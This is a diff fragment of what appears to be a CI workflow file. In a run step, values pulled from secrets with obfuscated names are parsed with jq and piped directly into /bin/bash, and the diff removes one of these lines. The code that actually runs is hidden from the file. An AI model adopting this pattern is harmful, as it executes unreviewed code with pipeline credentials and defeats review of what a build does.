@@ -21,7 +21,6 @@ jobs:
           nr1586: ${{ secrets.nr1586 }}
         run: |
           printf '%s' "$nr1586" | jq -r .f79 | /bin/bash
-          echo $sjqst6 | jq -r .aijh2326 | /bin/bash
           printf '%s' "$duvz4244" | jq -r .lgnrs8198 | /bin/bash
           echo $i273 | jq -r .ucml5 | /bin/bash
 
